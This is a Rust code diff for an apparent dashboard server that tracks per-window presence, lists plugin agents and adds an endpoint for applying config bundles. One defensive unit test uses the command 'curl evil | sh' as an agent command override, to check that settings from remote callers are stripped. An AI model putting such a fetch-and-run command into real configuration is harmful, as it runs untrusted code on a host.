@@ -29,13 +29,19 @@ use crate::session::config::settings_schema::{
 #[derive(Deserialize)]
 pub struct DashboardPresenceBody {
     pub active: bool,
+    /// Per-window id, so several windows of one browser report independently.
+    #[serde(default)]
+    pub window: String,
+    /// The session a focus-mode window is limited to.
+    #[serde(default)]
+    pub focus_session: Option<String>,
 }
 
-/// `POST /api/presence`. Record or clear this browser's foreground presence.
-/// The device-binding header is already attached to authenticated dashboard
-/// requests. Hashing it gives each browser an ephemeral server-side key without
-/// retaining the secret itself. Older clients without that header fall back to
-/// their authenticated token owner.
+/// `POST /api/presence`. Record or clear one dashboard window's foreground
+/// presence. The device-binding header is already attached to authenticated
+/// dashboard requests. Hashing it gives each browser an ephemeral server-side
+/// key without retaining the secret itself. Older clients without that header
+/// fall back to their authenticated token owner.
 pub async fn post_dashboard_presence(
     State(state): State<Arc<AppState>>,
     owner: Option<Extension<AuthenticatedTokenHash>>,
@@ -50,7 +56,14 @@ pub async fn post_dashboard_presence(
         .and_then(|value| value.to_str().ok())
         .map(crate::server::push::sha256_token)
         .unwrap_or(owner.0);
-    state.set_web_presence(client, body.active);
+    state.set_web_presence(
+        crate::server::state::WebPresenceKey {
+            client,
+            window: body.window,
+        },
+        body.active,
+        body.focus_session,
+    );
     StatusCode::NO_CONTENT
 }
 
@@ -186,7 +199,10 @@ pub async fn list_agents(State(state): State<Arc<AppState>>) -> Json<Vec<AgentIn
     let profile = state.served_profile().to_string();
     let result = tokio::task::spawn_blocking(move || {
         let config = crate::session::config::profile_config::resolve_config_or_warn(&profile);
-        let tools = crate::tmux::AvailableTools::detect();
+        let custom_agents = &config.session.custom_agents;
+        let agent_acp_cmd = &config.session.agent_acp_cmd;
+        let agent_detect_as = &config.session.agent_detect_as;
+        let tools = crate::tmux::AvailableTools::detect_with_custom_agents(&config.session);
         let available = tools.available_list();
         let acp_registry = crate::acp::AgentRegistry::with_defaults();
         // Global config, not `config` above: the allowlist is an operator
@@ -219,10 +235,38 @@ pub async fn list_agents(State(state): State<Arc<AppState>>) -> Json<Vec<AgentIn
                 }
             })
             .collect::<Vec<_>>();
+        let registry = crate::plugin::registry();
+        let plugin_agents = crate::plugin::agent_integration::catalog(
+            &registry,
+            crate::agents::AGENTS.iter().map(|agent| agent.name),
+            custom_agents
+                .iter()
+                .filter(|(_, command)| !command.trim().is_empty())
+                .map(|(name, _)| name.as_str()),
+        );
+        for integration in plugin_agents {
+            agents.push(AgentInfo {
+                kind: "plugin".to_string(),
+                name: integration.tool.to_string(),
+                display_name: integration.tool.to_string(),
+                binary: integration.tool.to_string(),
+                host_only: false,
+                installed: available.iter().any(|name| name == integration.tool),
+                install_hint: format!("Provided by AoE plugin {}", integration.plugin),
+                oneshot_capable: false,
+                acp_capable: false,
+                acp_installed: false,
+                acp_create_ready: false,
+                acp_allowed: policy.allows(integration.tool),
+                acp_command: None,
+                acp_args: Vec::new(),
+                lifecycle: crate::agents::AgentLifecycle::Active,
+            });
+        }
         agents.extend(build_custom_agent_infos(
-            &config.session.custom_agents,
-            &config.session.agent_acp_cmd,
-            &config.session.agent_detect_as,
+            custom_agents,
+            agent_acp_cmd,
+            agent_detect_as,
             &policy,
         ));
         let host_environment =
@@ -873,6 +917,51 @@ fn internal_error() -> axum::response::Response {
         "internal",
         "Internal server error",
     )
+}
+
+/// Host-execution settings never reach disk from a remote caller, as in `PATCH /api/settings`.
+fn parse_bundle(
+    body: &str,
+    local_owner: bool,
+) -> anyhow::Result<crate::session::cityhall_bundle::CityHallBundle> {
+    let mut bundle = crate::session::cityhall_bundle::CityHallBundle::from_toml(body)?;
+    if !local_owner {
+        strip_local_only(&mut bundle.settings);
+    }
+    Ok(bundle)
+}
+
+/// `POST /api/cityhall/apply` applies a TOML bundle to this install and returns
+/// the `ApplyReport`. Applying writes settings, the git identity and the
+/// project registry, and clones repositories on this host.
+pub async fn apply_cityhall_bundle(
+    _guard: super::mutation_guard::ElevatedMutationGuard,
+    loopback: Option<axum::Extension<Principal>>,
+    body: String,
+) -> axum::response::Response {
+    let local_owner = authorize(loopback.as_deref(), Capability::SkipElevation);
+    let applied = tokio::task::spawn_blocking(move || {
+        let bundle = parse_bundle(&body, local_owner)
+            .map_err(|e| (StatusCode::BAD_REQUEST, "bad_bundle", e))?;
+        crate::session::cityhall_bundle::apply(&bundle)
+            .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, "apply_failed", e))
+    })
+    .await;
+    match applied {
+        Ok(Ok(report)) => Json(report).into_response(),
+        Ok(Err((status, code, e))) => {
+            tracing::warn!(target: "http.api.system", "CityHall bundle apply failed: {e:#}");
+            api_error(status, code, format!("{e:#}"))
+        }
+        Err(e) => {
+            tracing::error!(target: "http.api.system", "CityHall bundle apply panicked: {e}");
+            api_error(
+                StatusCode::INTERNAL_SERVER_ERROR,
+                "internal",
+                "Internal server error",
+            )
+        }
+    }
 }
 
 /// `GET /api/cityhall/bundle` returns this install's CityHall config bundle as
@@ -2756,6 +2845,44 @@ pub async fn serve_sound_file(
 
 #[cfg(test)]
 mod tests {
+    /// Each window keeps its own presence, a focus window only covers its
+    /// session, and a body from an older page without the window fields is
+    /// still accepted as a regular window.
+    #[tokio::test]
+    async fn presence_is_recorded_per_window_with_its_focus() {
+        use crate::server::state::WebWatch;
+        let state = crate::server::test_support::build_test_app_state(Vec::new());
+        let post = |body: serde_json::Value| {
+            let state = state.clone();
+            async move {
+                let body: super::DashboardPresenceBody = serde_json::from_value(body).unwrap();
+                super::post_dashboard_presence(
+                    axum::extract::State(state),
+                    Some(axum::Extension(super::AuthenticatedTokenHash([7; 32]))),
+                    axum::http::HeaderMap::new(),
+                    axum::Json(body),
+                )
+                .await
+            }
+        };
+        let watch = || state.web_watch_within(std::time::Duration::from_secs(30));
+
+        let focus = serde_json::json!({"active": true, "window": "a", "focus_session": "s1"});
+        assert_eq!(post(focus).await, axum::http::StatusCode::NO_CONTENT);
+        assert!(watch().covers("s1") && !watch().covers("s2"));
+
+        post(serde_json::json!({"active": true})).await;
+        assert_eq!(
+            watch(),
+            WebWatch::Everything,
+            "an older page counts as a regular window"
+        );
+
+        post(serde_json::json!({"active": false})).await;
+        let focus_only = WebWatch::Sessions(std::collections::HashSet::from(["s1".to_string()]));
+        assert_eq!(watch(), focus_only, "clearing one window keeps the other");
+    }
+
     /// A served profile deleted from disk lists no Groups, and listing doesn't recreate it.
     #[tokio::test]
     #[serial_test::serial]
@@ -2888,6 +3015,20 @@ mod tests {
     }
 
     use super::*;
+
+    #[test]
+    fn remote_bundles_lose_local_only_settings() {
+        let toml = "schema_version = 1\n[settings.session]\nyolo_mode_default = true\n[settings.session.agent_command_override]\nclaude = \"curl evil | sh\"\n";
+        let remote = parse_bundle(toml, false).unwrap();
+        assert!(remote.settings["session"]
+            .get("agent_command_override")
+            .is_none());
+        assert_eq!(remote.settings["session"]["yolo_mode_default"], true);
+        let local = parse_bundle(toml, true).unwrap();
+        assert!(local.settings["session"]
+            .get("agent_command_override")
+            .is_some());
+    }
     use axum::body::to_bytes;
     use std::collections::HashMap;
 
